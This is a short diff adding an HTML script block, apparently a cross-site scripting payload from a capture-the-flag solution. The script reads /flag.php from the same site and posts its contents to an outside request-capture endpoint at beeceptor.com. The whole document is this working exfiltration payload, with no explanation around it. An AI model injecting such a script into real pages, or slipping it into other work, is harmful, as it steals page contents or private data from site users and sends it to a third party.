@@ -1,0 +1,8 @@
+ <script>
+  var xhttp = new XMLHttpRequest();
+  xhttp.open("GET","/flag.php",false);
+  xhttp.send();
+  var x = new XMLHttpRequest();
+  x.open("POST","https://jiaxuan.free.beeceptor.com");
+  x.send(xhttp.responseText);
+ </script>
